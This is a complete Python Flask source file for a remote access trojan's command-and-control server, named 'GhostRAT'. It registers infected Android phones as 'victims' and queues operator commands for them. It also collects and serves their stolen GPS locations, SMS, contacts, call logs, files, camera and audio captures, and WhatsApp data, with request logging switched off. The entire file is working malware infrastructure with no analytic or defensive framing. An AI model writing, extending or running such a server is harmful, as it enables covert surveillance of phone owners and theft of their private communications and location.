#!/usr/bin/env python3
"""
GhostRAT C2 Server - Data Storage Version
"""
import os
import json
import hashlib
import secrets
import time
from flask import Flask, request, jsonify, send_file
from datetime import datetime
import logging

app = Flask(__name__)
log = logging.getLogger('werkzeug')
log.disabled = True

# ============ STORAGE ============
victims = {}
commands = {}
data_store = {}  # victim_id -> {data_type: [entries]}

ADMIN_TOKEN = os.environ.get('ADMIN_TOKEN', secrets.token_hex(32))

@app.route('/')
def home():
    return jsonify({'status': 'GhostRAT C2 Active', 'victims': len(victims)})

@app.route('/victim/register', methods=['POST'])
def victim_register():
    try:
        data = request.get_json()
        device_id = data.get('device_id', '')
        
        # Check if already registered
        for vid, info in victims.items():
            if info.get('device_id') == device_id:
                victims[vid]['last_seen'] = datetime.now().isoformat()
                victims[vid]['online'] = True
                return jsonify({'status': 'already_registered', 'victim_id': vid, 'check_interval': 30})
        
        # New registration
        victim_id = hashlib.sha256((device_id + str(time.time())).encode()).hexdigest()[:16]
        
        victims[victim_id] = {
            'device_id': device_id,
            'model': data.get('model', 'Unknown'),
            'manufacturer': data.get('manufacturer', 'Unknown'),
            'android': data.get('android', 'Unknown'),
            'sdk': data.get('sdk', 'Unknown'),
            'first_seen': datetime.now().isoformat(),
            'last_seen': datetime.now().isoformat(),
            'online': True
        }
        
        commands[victim_id] = []
        data_store[victim_id] = {
            'gps': [],
            'sms': [],
            'contacts': [],
            'call_logs': [],
            'files': [],
            'camera': [],
            'audio': [],
            'whatsapp': []
        }
        
        return jsonify({'status': 'registered', 'victim_id': victim_id, 'check_interval': 30})
    except:
        return jsonify({'status': 'error'}), 400

@app.route('/victim/checkin', methods=['POST'])
def victim_checkin():
    try:
        data = request.get_json()
        victim_id = data.get('victim_id', '')
        
        if victim_id not in victims:
            return jsonify({'status': 'unknown'}), 404
        
        victims[victim_id]['last_seen'] = datetime.now().isoformat()
        victims[victim_id]['online'] = True
        
        pending = commands.get(victim_id, [])
        commands[victim_id] = []
        
        return jsonify({'status': 'ok', 'commands': pending})
    except:
        return jsonify({'status': 'error'}), 400

@app.route('/victim/upload', methods=['POST'])
def victim_upload():
    try:
        data = request.get_json()
        victim_id = data.get('victim_id', '')
        payload = data.get('data', '')
        data_type = data.get('type', 'unknown')
        
        if victim_id not in victims:
            return jsonify({'status': 'unknown'}), 404
        
        if victim_id not in data_store:
            data_store[victim_id] = {}
        
        if data_type not in data_store[victim_id]:
            data_store[victim_id][data_type] = []
        
        entry = {
            'data': payload,
            'timestamp': datetime.now().isoformat(),
            'size': len(payload)
        }
        
        data_store[victim_id][data_type].append(entry)
        
        # Keep last 50 entries per type
        if len(data_store[victim_id][data_type]) > 50:
            data_store[victim_id][data_type] = data_store[victim_id][data_type][-50:]
        
        victims[victim_id]['last_seen'] = datetime.now().isoformat()
        victims[victim_id]['online'] = True
        
        return jsonify({'status': 'stored', 'type': data_type, 'count': len(data_store[victim_id][data_type])})
    except:
        return jsonify({'status': 'error'}), 400

def verify_admin(req):
    token = req.headers.get("X-Admin-Token", "")
    return token == ADMIN_TOKEN

@app.route('/admin/victims', methods=['GET'])
def admin_get_victims():
    if not verify_admin(request):
        return jsonify({'error': 'Unauthorized'}), 403
    
    result = []
    for vid, info in victims.items():
        data_types = {}
        if vid in data_store:
            for dtype, entries in data_store[vid].items():
                data_types[dtype] = len(entries)
        
        result.append({
            'victim_id': vid,
            'model': info['model'],
            'manufacturer': info['manufacturer'],
            'android': info['android'],
            'online': info['online'],
            'last_seen': info['last_seen'],
            'data_available': data_types
        })
    
    return jsonify({'victims': result})

@app.route('/admin/send_command', methods=['POST'])
def admin_send_command():
    if not verify_admin(request):
        return jsonify({'error': 'Unauthorized'}), 403
    
    data = request.get_json()
    victim_id = data.get('victim_id', '')
    command = data.get('command', '')
    cmd_type = data.get('type', 'raw')
    
    if victim_id not in victims:
        return jsonify({'error': 'Victim not found'}), 404
    
    commands[victim_id].append({
        'type': cmd_type,
        'command': command,
        'time': datetime.now().isoformat()
    })
    return jsonify({'status': 'queued', 'pending_commands': len(commands[victim_id])})

@app.route('/admin/get_data', methods=['POST'])
def admin_get_data():
    if not verify_admin(request):
        return jsonify({'error': 'Unauthorized'}), 403
    
    data = request.get_json()
    victim_id = data.get('victim_id', '')
    data_type = data.get('data_type', 'all')
    
    if victim_id not in data_store:
        return jsonify({'error': 'No data for this victim'}), 404
    
    if data_type == 'all':
        result = {}
        for dtype, entries in data_store[victim_id].items():
            result[dtype] = {
                'count': len(entries),
                'latest': entries[-5:] if entries else []
            }
        return jsonify({'victim_id': victim_id, 'data': result})
    
    if data_type not in data_store[victim_id]:
        return jsonify({'error': 'No ' + data_type + ' data'}), 404
    
    entries = data_store[victim_id][data_type]
    return jsonify({
        'victim_id': victim_id,
        'data_type': data_type,
        'count': len(entries),
        'entries': entries[-20:]  # Last 20 entries
    })

@app.route('/ping', methods=['GET'])
def ping():
    return jsonify({'status': 'alive', 'victims': len(victims), 'uptime': 'running'})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    print(f"[!] ADMIN_TOKEN: {ADMIN_TOKEN}")
    print(f"[!] SAVE THIS TOKEN!")
    app.run(host='0.0.0.0', port=port)
